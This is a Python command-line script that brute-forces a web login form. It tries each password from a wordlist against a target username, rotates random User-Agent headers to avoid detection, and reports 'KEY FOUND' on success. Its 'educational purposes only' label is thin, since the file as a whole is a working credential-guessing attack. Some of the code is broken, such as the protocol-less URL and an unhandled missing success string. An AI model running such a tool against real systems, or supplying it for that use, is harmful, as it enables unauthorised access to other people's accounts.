import argparse
import requests
from fake_useragent import UserAgent
from time import sleep

def brute_force_login(url, username, password_list, success_url, port):
    ua = UserAgent()
    for password in password_list:
        headers = {
            "User-Agent": ua.random
        }
        
        # Replace the below form data structure with the actual form parameters from the target site
        data = {
            'username': username,
            'password': password,
            'submit': 'Login'  # Change this based on the login form's submission button name
        }

        # URL to post the login request
        login_url = f"{url}:{port}/login"  # Change this based on the actual login endpoint
        
        # Sending login request
        response = requests.post(login_url, data=data, headers=headers)
        
        if response.status_code == 200 and success_url in response.text:
            print(f"KEY FOUND: {password}")
            return password
        else:
            print(f"Attempting with password: {password}")
        
        sleep(1)  # Adding a delay between requests to avoid overwhelming the server

    print("KEY NOT FOUND")
    return None


def main():
    parser = argparse.ArgumentParser(description="Brute force login tool for educational purposes only.")
    parser.add_argument("-l", "--username", required=True, help="Target username")
    parser.add_argument("-P", "--password-list", required=True, help="Path to the password list file")
    parser.add_argument("url", help="Target URL (without protocol, e.g., 'example.com')")
    parser.add_argument("--redirect", help="Success URL for redirection after successful login")
    parser.add_argument("--port", type=int, default=80, help="Port number (default: 80)")
    
    args = parser.parse_args()
    
    # Read password list from file
    try:
        with open(args.password_list, 'r') as f:
            password_list = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"Error: The file {args.password_list} was not found.")
        return

    # Call brute_force_login with provided arguments
    brute_force_login(args.url, args.username, password_list, args.redirect, args.port)


if __name__ == "__main__":
    main()
